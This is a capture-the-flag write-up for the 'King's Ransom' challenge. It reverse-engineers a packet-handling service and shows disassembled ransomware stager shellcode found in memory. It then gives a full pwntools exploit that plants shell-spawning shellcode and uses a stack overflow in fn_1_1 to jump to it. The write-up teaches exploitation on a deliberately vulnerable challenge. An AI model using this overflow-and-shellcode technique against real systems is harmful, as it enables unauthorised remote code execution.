## King's Ransom

### Background

> A vulnerable service with your "bank account" information running on the target system. Too bad it has already been exploited by a piece of ransomware. The ransomware took over the target, encrypted some files on the file system, and resumed the executive loop.
> 
> Follow the footsteps.

We are provided with two files: challenge binary and libc.so.

### Analysis

The background information gives us an important detail: this is a vulnerable service that can be exploited. We need to first find a way to exploit the service ourselves, then we can figure out what the attacker did post-exploitation.

The main loops reads in a packet of data then calls a function pointer based on fields in the packet. The packet format is:

```
struct pkt {
	uint8_t magic0;
	uint8_t magic1;
	uint16_t length;
	uint16_t cksum;
	uint8_t fn0;
	uint8_t fn1;
	uint8_t data[];
}
```

The `fn0` and `fn1` fields determine which function pointer is called from the table. The 4x4 table contains 16 function pointers, which are set using `set_fn` at `0x4015DB`. By looking at cross references to the table and to `set_fn`, we find that there are 8 possible functions: `fn_0_0`, `fn_1_0`, `fn_1_1`, `fn_2_0`, `fn_2_1`, `fn_3_0`, `fn_3_3`, and `fn_default`.

Packets are created by `encode_data` at `0x40139B` and are parsed by `decode_data` at `0x401445`. We also see that there is a function that reads in two flags (flag1.txt and bank/flag2.txt) and runs `fn_2_1` on the each flag.

`fn_2_0` reads data from a global buffer that was mapped at `0x12800000` with RWX permissions. `fn_2_1` writes data to the same global buffer. For example, the function that read in the two flags stored them in the global buffer at indices 0 and 32, respectively.

If we read from the global buffer using `fn_2_0`, instead of flags, we get back binary data that looks suspiciously like shellcode:

```
0x0000000000000000:  F3 0F 1E FA                endbr64 
0x0000000000000004:  55                         push    rbp
0x0000000000000005:  48 89 E5                   mov     rbp, rsp
0x0000000000000008:  48 83 EC 30                sub     rsp, 0x30
0x000000000000000c:  B8 40 40 40 00             mov     eax, 0x404040
0x0000000000000011:  48 8B 00                   mov     rax, qword ptr [rax]
0x0000000000000014:  48 89 45 F8                mov     qword ptr [rbp - 8], rax
0x0000000000000018:  BA 30 11 11 00             mov     edx, 0x111130
0x000000000000001d:  48 8B 45 F8                mov     rax, qword ptr [rbp - 8]
0x0000000000000021:  48 29 D0                   sub     rax, rdx
0x0000000000000024:  48 89 45 F0                mov     qword ptr [rbp - 0x10], rax
0x0000000000000028:  48 8B 45 F8                mov     rax, qword ptr [rbp - 8]
0x000000000000002c:  48 89 45 E8                mov     qword ptr [rbp - 0x18], rax
0x0000000000000030:  BA 20 BA 11 00             mov     edx, 0x11ba20
0x0000000000000035:  48 8B 45 F0                mov     rax, qword ptr [rbp - 0x10]
0x0000000000000039:  48 01 D0                   add     rax, rdx
0x000000000000003c:  48 89 45 E0                mov     qword ptr [rbp - 0x20], rax
0x0000000000000040:  48 8B 45 E0                mov     rax, qword ptr [rbp - 0x20]
0x0000000000000044:  41 B9 00 00 00 00          mov     r9d, 0
0x000000000000004a:  41 B8 00 00 00 00          mov     r8d, 0
0x0000000000000050:  B9 22 00 00 00             mov     ecx, 0x22
0x0000000000000055:  BA 07 00 00 00             mov     edx, 7
0x000000000000005a:  BE 00 10 00 00             mov     esi, 0x1000
0x000000000000005f:  BF 00 00 00 00             mov     edi, 0
0x0000000000000064:  FF D0                      call    rax
0x0000000000000066:  48 89 45 D8                mov     qword ptr [rbp - 0x28], rax
0x000000000000006a:  48 C7 45 D0 00 00 00 00    mov     qword ptr [rbp - 0x30], 0
0x0000000000000072:  48 8D 45 D0                lea     rax, [rbp - 0x30]
0x0000000000000076:  48 8B 4D E8                mov     rcx, qword ptr [rbp - 0x18]
0x000000000000007a:  BA 04 00 00 00             mov     edx, 4
0x000000000000007f:  48 89 C6                   mov     rsi, rax
0x0000000000000082:  BF 00 00 00 00             mov     edi, 0
0x0000000000000087:  FF D1                      call    rcx
0x0000000000000089:  48 8B 55 D0                mov     rdx, qword ptr [rbp - 0x30]
0x000000000000008d:  48 8B 45 D8                mov     rax, qword ptr [rbp - 0x28]
0x0000000000000091:  48 8B 4D E8                mov     rcx, qword ptr [rbp - 0x18]
0x0000000000000095:  48 89 C6                   mov     rsi, rax
0x0000000000000098:  BF 00 00 00 00             mov     edi, 0
0x000000000000009d:  FF D1                      call    rcx
0x000000000000009f:  48 8B 45 D8                mov     rax, qword ptr [rbp - 0x28]
0x00000000000000a3:  FF D0                      call    rax
0x00000000000000a5:  C9                         leave   
0x00000000000000a6:  C3                         ret    
```

This shellcode reads the GOT entry for `read` and uses it to figure the base address of `libc.so` which was provided to us. The shellcode does not give us very much information since it is a stager that allocates another RWX memory page, reads in additional shellcode, and executes it.

While the shellcode is a dead-end for now, it does tell us that there should be a vulnerability that allows us to execute shellcode at address `0x12800000`.

### Solution

After looking through each of the functions that we can run, we notice that the `decode_data` function will blindly copy data into the destination buffer. While this function is usually called by a wrapper function that uses `malloc` to allocate a large enough buffer, `fn_1_1` calls it directly.

```
int __fastcall fn_1_1(pkt_t *a1)
{
  int v1; // xmm0_4
  int v2; // xmm0_4
  int v3; // xmm0_4
  int v5[3]; // [rsp+14h] [rbp-Ch] BYREF

  decode_data(a1, v5);
  *(float *)&v1 = 0.01 * *(float *)v5 + *(float *)&dword_404090;
  dword_404090 = v1;
  *(float *)&v2 = 0.01 * *(float *)&v5[1] + *(float *)&dword_404094;
  dword_404094 = v2;
  *(float *)&v3 = 0.01 * *(float *)&v5[2] + *(float *)&dword_404098;
  dword_404098 = v3;
  return 1;
}
```

If we send a packet with a large amount of data, it will overflow the `v5` stack array and we can control the return address.

Exploitation is very simple. First we store some shellcode on the RWX page using `fn_2_1`. Then we run `fn_1_1` and overflow the stack buffer. We can use pwntools to build shellcode that gives us shell:

```
from pwn import *
context.arch = 'amd64'
r = remote('wealthy-rock.satellitesabove.me', 5010)

r.recvuntil('Ticket please:\n')
r.sendline('ticket{...}')

r.recvuntil('Starting up Service on tcp:')
host, port = r.recvuntil(b'\n').strip().split(b':')

r2 = remote(host, int(port))

def cksum(s):
    x = 0x1d0f
    for c in s:
        x ^= c << 8
        for n in range(8):
            if x & 0x8000:
                x = (2 * x) ^ 0xa02b
            else:
                x = 2 * x
    return x & 0xffff

fn0 = 2
fn1 = 1
data = p16(0) + p16(64) + asm(shellcraft.amd64.linux.sh())
r2.send(p8(0x55) + p8(0xaa) + p16(len(data)) + p16(cksum(data)) + p8(fn0) + p8(fn1) + data)

fn0 = 1
fn1 = 1
data = b'A' * 12 + p64(0) + p64(0x12800000)
r2.send(p8(0x55) + p8(0xaa) + p16(len(data)) + p16(cksum(data)) + p8(fn0) + p8(fn1) + data)
r2.interactive()
```

Once we have a shell, we can `cat flag1.txt` and get the flag.